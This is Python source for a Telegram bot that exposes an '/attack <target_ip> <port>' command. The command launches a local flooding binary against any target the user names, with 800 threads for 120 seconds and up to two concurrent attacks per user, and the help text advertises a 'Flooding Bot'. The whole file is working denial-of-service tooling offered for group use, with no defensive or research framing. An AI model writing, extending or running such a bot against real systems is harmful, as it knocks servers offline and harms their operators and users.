import subprocess
import json
import os
import asyncio
from telegram import Update, Chat
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
DEFAULT_THREADS = 800
DEFAULT_PACKET = 30
DEFAULT_DURATION = 120  # Set default duration

users = {}
user_processes = {}  # Dictionary to track processes for each user (now a list)

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

async def is_group_chat(update: Update) -> bool:
    """Check if the chat is a group or supergroup."""
    return update.message.chat.type in [Chat.GROUP, Chat.SUPERGROUP]

async def private_chat_warning(update: Update) -> None:
    """Send a warning if the bot is used in a private chat."""
    await update.message.reply_text("This bot is not designed for private chats. Please use it in a Telegram group.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await is_group_chat(update):
        await private_chat_warning(update)
        return

    user_id = str(update.message.from_user.id)

    if len(context.args) != 2:
        await update.message.reply_text('Usage: /attack <target_ip> <port>')
        return

    target_ip = context.args[0]
    port = context.args[1]

    # Check if user has already reached attack limit (2 concurrent attacks)
    if user_id in user_processes and len(user_processes[user_id]) >= 2:
        await update.message.reply_text("\u26a0\ufe0f You already have two attacks running. Please wait for one to finish.")
        return

    flooding_command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
    
    # Ensure the user has an entry in the process tracking dictionary
    if user_id not in user_processes:
        user_processes[user_id] = []

    # Start the attack in a separate background task
    task = asyncio.create_task(run_attack(update, flooding_command, user_id))
    user_processes[user_id].append(task)

    await update.message.reply_text(f'✅ Flooding started: {target_ip}:{port} for {DEFAULT_DURATION} seconds.')

async def run_attack(update: Update, command, user_id):
    """Run the attack in the background without blocking other bot commands."""
    process = subprocess.Popen(command)
    
    try:
        await asyncio.sleep(DEFAULT_DURATION)  # Attack duration
        process.terminate()  # Stop attack
        await update.message.reply_text(f'⏹️ Flooding attack finished: {command[1]}:{command[2]}.')
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error: {e}")
    finally:
        # Remove the completed process from the user's list
        if user_id in user_processes:
            user_processes[user_id] = [p for p in user_processes[user_id] if p != asyncio.current_task()]
            if not user_processes[user_id]:  # Clean up empty lists
                del user_processes[user_id]

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await is_group_chat(update):
        await private_chat_warning(update)
        return

    response = (
        f"Welcome to the Flooding Bot by @{OWNER_USERNAME}! Here are the available commands:\n\n"
        "User Commands:\n"
        "/attack <target_ip> <port> - Start a flooding attack with default time and threads.\n"
    )
    await update.message.reply_text(response)

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("help", help_command))

    global users
    users = load_users()
    application.run_polling()

if __name__ == '__main__':
    main()
